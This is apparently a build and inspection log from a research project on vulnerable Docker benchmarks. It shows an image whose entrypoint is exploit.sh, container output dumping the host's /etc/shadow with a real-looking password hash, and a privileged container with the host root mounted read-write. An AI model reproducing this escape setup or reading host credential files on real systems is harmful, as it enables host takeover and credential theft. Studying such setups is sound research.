#1 [internal] load local bake definitions
#1 reading from stdin 729B done
#1 DONE 0.0s

#2 [internal] load build definition from Dockerfile.exploit
#2 transferring dockerfile: 205B done
#2 DONE 0.0s

#3 [internal] load metadata for docker.io/library/alpine:3.18
#3 DONE 0.3s

#4 [internal] load .dockerignore
#4 transferring context: 2B done
#4 DONE 0.0s

#5 [1/4] FROM docker.io/library/alpine:3.18@sha256:de0eb0b3f2a47ba1eb89389859a9bd88b28e82f5826b6969ad604979713c2d4f
#5 resolve docker.io/library/alpine:3.18@sha256:de0eb0b3f2a47ba1eb89389859a9bd88b28e82f5826b6969ad604979713c2d4f 0.0s done
#5 CACHED

#6 [internal] load build context
#6 transferring context: 463B done
#6 DONE 0.0s

#7 [2/4] RUN apk update && apk add --no-cache ffmpeg curl
#7 0.187 fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/main/x86_64/APKINDEX.tar.gz
#7 0.382 fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/community/x86_64/APKINDEX.tar.gz
#7 0.748 v3.18.12-140-g3d8a58a5f14 [https://dl-cdn.alpinelinux.org/alpine/v3.18/main]
#7 0.748 v3.18.12-132-ge2ea6f61358 [https://dl-cdn.alpinelinux.org/alpine/v3.18/community]
#7 0.748 OK: 20070 distinct packages available
#7 0.805 fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/main/x86_64/APKINDEX.tar.gz
#7 1.003 fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/community/x86_64/APKINDEX.tar.gz
#7 1.441 (1/106) Installing ca-certificates (20241121-r1)
#7 1.497 (2/106) Installing brotli-libs (1.0.9-r14)
#7 1.582 (3/106) Installing libunistring (1.1-r1)
#7 1.717 (4/106) Installing libidn2 (2.3.4-r1)
#7 1.755 (5/106) Installing nghttp2-libs (1.57.0-r0)
#7 1.782 (6/106) Installing libpsl (0.21.5-r0)
#7 1.805 (7/106) Installing libcurl (8.12.1-r0)
#7 1.873 (8/106) Installing curl (8.12.1-r0)
#7 1.914 (9/106) Installing sdl2 (2.26.5-r0)
#7 2.044 (10/106) Installing svt-av1-libs (1.6.0-r0)
#7 2.817 (11/106) Installing aom-libs (3.6.1-r0)
#7 3.540 (12/106) Installing libxau (1.0.11-r2)
#7 3.557 (13/106) Installing libmd (1.0.4-r2)
#7 3.578 (14/106) Installing libbsd (0.11.7-r1)
#7 3.602 (15/106) Installing libxdmcp (1.1.4-r2)
#7 3.620 (16/106) Installing libxcb (1.15-r1)
#7 3.698 (17/106) Installing libx11 (1.8.7-r0)
#7 3.934 (18/106) Installing hwdata-pci (0.370-r0)
#7 4.031 (19/106) Installing libpciaccess (0.17-r2)
#7 4.064 (20/106) Installing libdrm (2.4.115-r4)
#7 4.117 (21/106) Installing libxext (1.3.5-r2)
#7 4.138 (22/106) Installing libxfixes (6.0.1-r2)
#7 4.155 (23/106) Installing libffi (3.4.4-r2)
#7 4.177 (24/106) Installing wayland-libs-client (1.22.0-r2)
#7 4.217 (25/106) Installing libva (2.18.0-r1)
#7 4.273 (26/106) Installing libvdpau (1.5-r1)
#7 4.313 (27/106) Installing libgcc (12.2.1_git20220924-r10)
#7 4.345 (28/106) Installing libstdc++ (12.2.1_git20220924-r10)
#7 4.564 (29/106) Installing onevpl-libs (2023.2.1-r0)
#7 4.601 (30/106) Installing ffmpeg-libavutil (6.0.1-r0)
#7 4.708 (31/106) Installing libdav1d (1.2.1-r0)
#7 4.886 (32/106) Installing libhwy (1.0.4-r1)
#7 4.990 (33/106) Installing lcms2 (2.15-r2)
#7 5.069 (34/106) Installing libjxl (0.8.2-r0)
#7 5.897 (35/106) Installing lame-libs (3.100-r5)
#7 5.965 (36/106) Installing opus (1.4-r0)
#7 6.063 (37/106) Installing libgomp (12.2.1_git20220924-r10)
#7 6.122 (38/106) Installing soxr (0.1.3-r5)
#7 6.179 (39/106) Installing ffmpeg-libswresample (6.0.1-r0)
#7 6.212 (40/106) Installing libogg (1.3.5-r4)
#7 6.262 (41/106) Installing libtheora (1.1.1-r17)
#7 6.397 (42/106) Installing libvorbis (1.3.7-r1)
#7 6.500 (43/106) Installing libvpx (1.13.0-r2)
#7 6.916 (44/106) Installing libwebp (1.3.2-r0)
#7 7.051 (45/106) Installing x264-libs (0.164_git20220602-r1)
#7 7.493 (46/106) Installing numactl (2.0.16-r4)
#7 7.528 (47/106) Installing x265-libs (3.5-r4)
#7 10.52 (48/106) Installing xvidcore (1.3.7-r1)
#7 11.03 (49/106) Installing ffmpeg-libavcodec (6.0.1-r0)
#7 13.44 (50/106) Installing alsa-lib (1.2.9-r1)
#7 13.61 (51/106) Installing libexpat (2.7.0-r0)
#7 13.64 (52/106) Installing libbz2 (1.0.8-r5)
#7 13.67 (53/106) Installing libpng (1.6.44-r0)
#7 13.71 (54/106) Installing freetype (2.13.0-r5)
#7 13.82 (55/106) Installing fontconfig (2.14.2-r3)
#7 13.88 (56/106) Installing fribidi (1.0.13-r0)
#7 13.90 (57/106) Installing libintl (0.21.1-r7)
#7 13.93 (58/106) Installing libblkid (2.38.1-r8)
#7 13.98 (59/106) Installing libmount (2.38.1-r8)
#7 14.02 (60/106) Installing pcre2 (10.42-r1)
#7 14.10 (61/106) Installing glib (2.76.6-r0)
#7 14.41 (62/106) Installing graphite2 (1.3.14-r5)
#7 14.44 (63/106) Installing harfbuzz (7.3.0-r0)
#7 14.55 (64/106) Installing libunibreak (5.1-r0)
#7 14.57 (65/106) Installing libass (0.17.1-r0)
#7 14.60 (66/106) Installing libbluray (1.3.4-r0)
#7 14.66 (67/106) Installing gmp (6.2.1-r3)
#7 14.72 (68/106) Installing nettle (3.8.1-r2)
#7 14.80 (69/106) Installing p11-kit (0.24.1-r2)
#7 14.88 (70/106) Installing libtasn1 (4.20.0-r0)
#7 14.90 (71/106) Installing gnutls (3.8.4-r0)
#7 15.10 (72/106) Installing mpg123-libs (1.31.3-r1)
#7 15.14 (73/106) Installing libopenmpt (0.7.2-r0)
#7 15.30 (74/106) Installing cjson (1.7.17-r0)
#7 15.40 (75/106) Installing mbedtls (2.28.10-r0)
#7 15.49 (76/106) Installing librist (0.2.7-r0)
#7 15.54 (77/106) Installing libsrt (1.5.2-r0)
#7 15.65 (78/106) Installing libssh (0.10.5-r0)
#7 15.70 (79/106) Installing xz-libs (5.4.3-r1)
#7 15.73 (80/106) Installing libxml2 (2.11.8-r3)
#7 15.85 (81/106) Installing libsodium (1.0.18-r3)
#7 15.89 (82/106) Installing libzmq (4.3.4-r4)
#7 15.97 (83/106) Installing ffmpeg-libavformat (6.0.1-r0)
#7 16.22 (84/106) Installing glslang-libs (1.3.243.0-r1)
#7 16.46 (85/106) Installing spirv-tools (1.3.243.0-r1)
#7 16.75 (86/106) Installing shaderc (2023.3-r1)
#7 16.78 (87/106) Installing vulkan-loader (1.3.243.0-r1)
#7 16.84 (88/106) Installing libplacebo (5.264.1-r1)
#7 16.92 (89/106) Installing ffmpeg-libpostproc (6.0.1-r0)
#7 16.94 (90/106) Installing ffmpeg-libswscale (6.0.1-r0)
#7 17.01 (91/106) Installing vidstab (1.1.1-r0)
#7 17.03 (92/106) Installing zimg (3.0.5-r0)
#7 17.11 (93/106) Installing ffmpeg-libavfilter (6.0.1-r0)
#7 17.50 (94/106) Installing libasyncns (0.8-r1)
#7 17.52 (95/106) Installing dbus-libs (1.14.8-r0)
#7 17.56 (96/106) Installing libltdl (2.4.7-r2)
#7 17.58 (97/106) Installing orc (0.4.39-r0)
#7 17.63 (98/106) Installing flac-libs (1.4.3-r0)
#7 17.68 (99/106) Installing libsndfile (1.2.2-r1)
#7 17.73 (100/106) Installing speexdsp (1.2.1-r1)
#7 17.75 (101/106) Installing tdb-libs (1.4.8-r1)
#7 17.79 (102/106) Installing libpulse (16.1-r10)
#7 17.91 (103/106) Installing libjpeg-turbo (2.1.5.1-r3)
#7 17.97 (104/106) Installing v4l-utils-libs (1.24.1-r0)
#7 18.02 (105/106) Installing ffmpeg-libavdevice (6.0.1-r0)
#7 18.05 (106/106) Installing ffmpeg (6.0.1-r0)
#7 18.14 Executing busybox-1.36.1-r7.trigger
#7 18.15 Executing ca-certificates-20241121-r1.trigger
#7 18.19 Executing glib-2.76.6-r0.trigger
#7 18.20 OK: 131 MiB in 121 packages
#7 DONE 18.3s

#8 [3/4] COPY exploit.sh /exploit.sh
#8 DONE 0.0s

#9 [4/4] RUN chmod +x /exploit.sh
#9 DONE 0.3s

#10 exporting to image
#10 exporting layers
#10 exporting layers 4.2s done
#10 exporting manifest sha256:56e77e66b6ac09bc4ce715e9402880df483603c58e6f33de700f78d32100699a 0.0s done
#10 exporting config sha256:8f90e9bd80f4050a27484ed006a242659ea93e6f9bad15fed9321313336c3025 done
#10 exporting attestation manifest sha256:cc75f2485933658ac74e0cd9836482fef7eb4b30d7ac8b26da3b66db139951c6 0.0s done
#10 exporting manifest list sha256:31f2253e74abe78fd33c6bc4cae6b63502a67f50d74484387532360b6fec13d0 0.0s done
#10 naming to docker.io/library/custom_no_tool-vulnerable:latest done
#10 unpacking to docker.io/library/custom_no_tool-vulnerable:latest
#10 unpacking to docker.io/library/custom_no_tool-vulnerable:latest 0.8s done
#10 DONE 5.1s

#11 resolving provenance for metadata file
#11 DONE 0.0s
 custom_no_tool-vulnerable  Built
 Network custom_no_tool_default  Creating
 Network custom_no_tool_default  Created
 Container custom_no_tool-vulnerable-1  Creating
 Container custom_no_tool-vulnerable-1  Created
 Container custom_no_tool-vulnerable-1  Starting
 Container custom_no_tool-vulnerable-1  Started


sudo docker logs ee5c19ea78fcf48ec6159d817d27446f489cd010914ba480ec1044969389eb8c --details
STDOUT:  --- HOST /etc/shadow BEGIN ---
 root:*:20134:0:99999:7:::
 daemon:*:20134:0:99999:7:::
 bin:*:20134:0:99999:7:::
 sys:*:20134:0:99999:7:::
 sync:*:20134:0:99999:7:::
 games:*:20134:0:99999:7:::
 man:*:20134:0:99999:7:::
 lp:*:20134:0:99999:7:::
 mail:*:20134:0:99999:7:::
 news:*:20134:0:99999:7:::
 uucp:*:20134:0:99999:7:::
 proxy:*:20134:0:99999:7:::
 www-data:*:20134:0:99999:7:::
 backup:*:20134:0:99999:7:::
 list:*:20134:0:99999:7:::
 irc:*:20134:0:99999:7:::
 _apt:*:20134:0:99999:7:::
 nobody:*:20134:0:99999:7:::
 systemd-network:!*:20134::::::
 systemd-timesync:!*:20134::::::
 dhcpcd:!:20134::::::
 messagebus:!:20134::::::
 syslog:!:20134::::::
 systemd-resolve:!*:20134::::::
 uuidd:!:20134::::::
 landscape:!:20134::::::
 polkitd:!*:20134::::::
 gabriele:$y$j9T$zhXKkkKLJ3NiSJR2psvYw1$IRBcaXls.9L7dcPxM9ISELjNx/Gxq4yIEPBiL7RJ9V5:20237:0:99999:7:::
 tcpdump:!:20272::::::
 --- HOST /etc/shadow END ---

STDERR: 



sudo docker inspect ee5c19ea78fcf48ec6159d817d27446f489cd010914ba480ec1044969389eb8c[
    {
        "Id": "ee5c19ea78fcf48ec6159d817d27446f489cd010914ba480ec1044969389eb8c",
        "Created": "2025-10-29T22:10:38.713832839Z",
        "Path": "/exploit.sh",
        "Args": [
            "sh",
            "-c",
            "while true; do sleep 3600; done"
        ],
        "State": {
            "Status": "running",
            "Running": true,
            "Paused": false,
            "Restarting": false,
            "OOMKilled": false,
            "Dead": false,
            "Pid": 3993,
            "ExitCode": 0,
            "Error": "",
            "StartedAt": "2025-10-29T22:10:39.005757495Z",
            "FinishedAt": "0001-01-01T00:00:00Z"
        },
        "Image": "sha256:31f2253e74abe78fd33c6bc4cae6b63502a67f50d74484387532360b6fec13d0",
        "ResolvConfPath": "/var/lib/docker/containers/ee5c19ea78fcf48ec6159d817d27446f489cd010914ba480ec1044969389eb8c/resolv.conf",
        "HostnamePath": "/var/lib/docker/containers/ee5c19ea78fcf48ec6159d817d27446f489cd010914ba480ec1044969389eb8c/hostname",
        "HostsPath": "/var/lib/docker/containers/ee5c19ea78fcf48ec6159d817d27446f489cd010914ba480ec1044969389eb8c/hosts",
        "LogPath": "/var/lib/docker/containers/ee5c19ea78fcf48ec6159d817d27446f489cd010914ba480ec1044969389eb8c/ee5c19ea78fcf48ec6159d817d27446f489cd010914ba480ec1044969389eb8c-json.log",
        "Name": "/custom_no_tool-vulnerable-1",
        "RestartCount": 0,
        "Driver": "overlayfs",
        "Platform": "linux",
        "MountLabel": "",
        "ProcessLabel": "",
        "AppArmorProfile": "",
        "ExecIDs": null,
        "HostConfig": {
            "Binds": [
                "/:/host:rw"
            ],
            "ContainerIDFile": "",
            "LogConfig": {
                "Type": "json-file",
                "Config": {}
            },
            "NetworkMode": "custom_no_tool_default",
            "PortBindings": {
                "8080/tcp": [
                    {
                        "HostIp": "",
                        "HostPort": "8080"
                    }
                ]
            },
            "RestartPolicy": {
                "Name": "no",
                "MaximumRetryCount": 0
            },
            "AutoRemove": false,
            "VolumeDriver": "",
            "VolumesFrom": null,
            "ConsoleSize": [
                0,
                0
            ],
            "CapAdd": null,
            "CapDrop": null,
            "CgroupnsMode": "private",
            "Dns": null,
            "DnsOptions": null,
            "DnsSearch": null,
            "ExtraHosts": [],
            "GroupAdd": null,
            "IpcMode": "private",
            "Cgroup": "",
            "Links": null,
            "OomScoreAdj": 0,
            "PidMode": "",
            "Privileged": true,
            "PublishAllPorts": false,
            "ReadonlyRootfs": false,
            "SecurityOpt": [
                "label=disable"
            ],
            "UTSMode": "",
            "UsernsMode": "",
            "ShmSize": 67108864,
            "Runtime": "runc",
            "Isolation": "",
            "CpuShares": 0,
            "Memory": 0,
            "NanoCpus": 0,
            "CgroupParent": "",
            "BlkioWeight": 0,
            "BlkioWeightDevice": null,
            "BlkioDeviceReadBps": null,
            "BlkioDeviceWriteBps": null,
            "BlkioDeviceReadIOps": null,
            "BlkioDeviceWriteIOps": null,
            "CpuPeriod": 0,
            "CpuQuota": 0,
            "CpuRealtimePeriod": 0,
            "CpuRealtimeRuntime": 0,
            "CpusetCpus": "",
            "CpusetMems": "",
            "Devices": null,
            "DeviceCgroupRules": null,
            "DeviceRequests": null,
            "MemoryReservation": 0,
            "MemorySwap": 0,
            "MemorySwappiness": null,
            "OomKillDisable": null,
            "PidsLimit": null,
            "Ulimits": null,
            "CpuCount": 0,
            "CpuPercent": 0,
            "IOMaximumIOps": 0,
            "IOMaximumBandwidth": 0,
            "MaskedPaths": null,
            "ReadonlyPaths": null
        },
        "GraphDriver": {
            "Data": null,
            "Name": "overlayfs"
        },
        "Mounts": [
            {
                "Type": "bind",
                "Source": "/",
                "Destination": "/host",
                "Mode": "rw",
                "RW": true,
                "Propagation": "rprivate"
            }
        ],
        "Config": {
            "Hostname": "ee5c19ea78fc",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": true,
            "AttachStderr": true,
            "ExposedPorts": {
                "8080/tcp": {}
            },
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
            ],
            "Cmd": [
                "sh",
                "-c",
                "while true; do sleep 3600; done"
            ],
            "Image": "custom_no_tool-vulnerable",
            "Volumes": null,
            "WorkingDir": "/",
            "Entrypoint": [
                "/exploit.sh"
            ],
            "OnBuild": null,
            "Labels": {
                "com.docker.compose.config-hash": "14ff171fe7e689fa90b3787b499228f405bbe140b78d41afa5a2f8ae83e247cf",
                "com.docker.compose.container-number": "1",
                "com.docker.compose.depends_on": "",
                "com.docker.compose.image": "sha256:31f2253e74abe78fd33c6bc4cae6b63502a67f50d74484387532360b6fec13d0",
                "com.docker.compose.oneoff": "False",
                "com.docker.compose.project": "custom_no_tool",
                "com.docker.compose.project.config_files": "/home/gabriele/thesis-project/Agents-for-Vulnerable-Dockers-and-related-Benchmarks/dockers/CVE-2016-1897/custom_no_tool/docker-compose.yml",
                "com.docker.compose.project.working_dir": "/home/gabriele/thesis-project/Agents-for-Vulnerable-Dockers-and-related-Benchmarks/dockers/CVE-2016-1897/custom_no_tool",
                "com.docker.compose.service": "vulnerable",
                "com.docker.compose.version": "2.40.2",
                "desktop.docker.io/wsl-distro": "Ubuntu"
            },
            "StopTimeout": 1
        },
        "NetworkSettings": {
            "Bridge": "",
            "SandboxID": "dbb8b312018f8699295ded5dbc22f7ba46014bf8bc4fbb5fcccb59f76dbab700",
            "SandboxKey": "/var/run/docker/netns/dbb8b312018f",
            "Ports": {
                "8080/tcp": [
                    {
                        "HostIp": "0.0.0.0",
                        "HostPort": "8080"
                    },
                    {
                        "HostIp": "::",
                        "HostPort": "8080"
                    }
                ]
            },
            "HairpinMode": false,
            "LinkLocalIPv6Address": "",
            "LinkLocalIPv6PrefixLen": 0,
            "SecondaryIPAddresses": null,
            "SecondaryIPv6Addresses": null,
            "EndpointID": "",
            "Gateway": "",
            "GlobalIPv6Address": "",
            "GlobalIPv6PrefixLen": 0,
            "IPAddress": "",
            "IPPrefixLen": 0,
            "IPv6Gateway": "",
            "MacAddress": "",
            "Networks": {
                "custom_no_tool_default": {
                    "IPAMConfig": null,
                    "Links": null,
                    "Aliases": [
                        "custom_no_tool-vulnerable-1",
                        "vulnerable"
                    ],
                    "MacAddress": "6e:eb:5f:ef:9b:45",
                    "DriverOpts": null,
                    "GwPriority": 0,
                    "NetworkID": "baac18abb2c95fb84cd38ca1ab1cb8e6a6a2c86a588e02fb4389dbb31f1fa90c",
                    "EndpointID": "1ff2f8b4ec62be1c9c7ec2b50f96cbdea9a7a7259e968719b457329900a1c9b8",
                    "Gateway": "172.18.0.1",
                    "IPAddress": "172.18.0.2",
                    "IPPrefixLen": 16,
                    "IPv6Gateway": "",
                    "GlobalIPv6Address": "",
                    "GlobalIPv6PrefixLen": 0,
                    "DNSNames": [
                        "custom_no_tool-vulnerable-1",
                        "vulnerable",
                        "ee5c19ea78fc"
                    ]
                }
            }
        },
        "ImageManifestDescriptor": {
            "mediaType": "application/vnd.oci.image.manifest.v1+json",
            "digest": "sha256:56e77e66b6ac09bc4ce715e9402880df483603c58e6f33de700f78d32100699a",
            "size": 1050,
            "platform": {
                "architecture": "amd64",
                "os": "linux"
            }
        }
    }
]

sudo docker inspect 31f2253e74ab[
    {
        "Id": "sha256:31f2253e74abe78fd33c6bc4cae6b63502a67f50d74484387532360b6fec13d0",
        "RepoTags": [
            "custom_no_tool-vulnerable:latest"
        ],
        "RepoDigests": [
            "custom_no_tool-vulnerable@sha256:31f2253e74abe78fd33c6bc4cae6b63502a67f50d74484387532360b6fec13d0"
        ],
        "Parent": "",
        "Comment": "buildkit.dockerfile.v0",
        "Created": "2025-10-29T22:10:33.411514953Z",
        "DockerVersion": "",
        "Author": "",
        "Architecture": "amd64",
        "Os": "linux",
        "Size": 53727030,
        "GraphDriver": {
            "Data": null,
            "Name": "overlayfs"
        },
        "RootFS": {
            "Type": "layers",
            "Layers": [
                "sha256:f44f286046d9443b2aeb895c0e1f4e688698247427bca4d15112c8e3432a803e",
                "sha256:5065124cff129ce41b7ceaa037a09a641ac1c3ed12f943e60ea5235a394aeed8",
                "sha256:292fc9d03a4150276828701cb77571507787276655cc8bf29c3af9974251c0c3",
                "sha256:bc8536d9861a8c96365989b1a4f5e3c1935c2d397b4caed4c4c97310fc00a101"
            ]
        },
        "Metadata": {
            "LastTagTime": "2025-10-29T22:10:37.722020242Z"
        },
        "Descriptor": {
            "mediaType": "application/vnd.oci.image.index.v1+json",
            "digest": "sha256:31f2253e74abe78fd33c6bc4cae6b63502a67f50d74484387532360b6fec13d0",
            "size": 856
        },
        "Config": {
            "Cmd": null,
            "Entrypoint": [
                "/exploit.sh"
            ],
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
            ],
            "ExposedPorts": {
                "8080/tcp": {}
            },
            "Labels": {
                "com.docker.compose.project": "custom_no_tool",
                "com.docker.compose.service": "vulnerable",
                "com.docker.compose.version": "2.40.2"
            },
            "OnBuild": null,
            "User": "",
            "Volumes": null,
            "WorkingDir": "/"
        }
    }
]